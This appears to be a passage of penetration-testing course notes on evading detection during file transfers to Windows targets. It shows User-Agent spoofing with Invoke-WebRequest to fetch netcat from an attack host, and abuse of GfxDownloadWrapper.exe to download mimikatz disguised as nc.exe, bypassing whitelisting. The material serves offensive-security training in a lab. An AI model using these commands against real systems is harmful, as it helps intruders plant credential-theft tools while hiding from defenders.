## Evading Detection

#### Changing User Agent

If diligent administrators or defenders have blacklisted certain User Agents, `Invoke-WebRequest` contains a `UserAgent` parameter. This allows for changing the default user agent to one emulating browsers like Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, setting a User Agent to emulate Chrome may make the request appear legitimate if Chrome is commonly used internally.

#### Listing User Agents

```
evading_detection
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16
```

#### Invoking `Invoke-WebRequest` with a Chrome User Agent

**Request Example:**

```
Request with Chrome User Agent
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**Listening on Attack Host:**

```
evading_detection
0xs5@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders. In these cases, an option is to use a "LOLBIN" (Living Off the Land Binary), also known as "misplaced trust binaries."

#### Example: GfxDownloadWrapper.exe

The Intel Graphics Driver for Windows 10 (`GfxDownloadWrapper.exe`), installed on some systems, contains functionality to periodically download configuration files. This functionality can be leveraged as follows:

**Transferring File with GfxDownloadWrapper.exe:**

```
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such binaries may bypass application whitelisting and avoid alerting. Other binaries can also be found via the LOLBAS project for Windows and the GTFOBins project for Linux. These resources provide detailed information on commonly installed binaries suitable for file transfers.

### Closing Thoughts

There are numerous ways to transfer files between an attack host and Windows or Linux systems. Practicing these methods in various environments helps to:

- Build familiarity with tools and techniques.
    
- Save time during assessments by knowing multiple file transfer options.
    

When working on a target or lab, experiment with LOLBins or GTFOBins you haven't used before to accomplish file transfer goals. Regularly revisiting these methods ensures preparedness for diverse scenarios.

Also, take advantage of web shells or other footholds by testing alternative file transfer methods such as:

- Certutil for downloading files.
    
- Impacket SMB server.
    
- Python web servers with upload capabilities.
    

With practice and creativity, you'll become adept at transferring files covertly and effectively during engagements.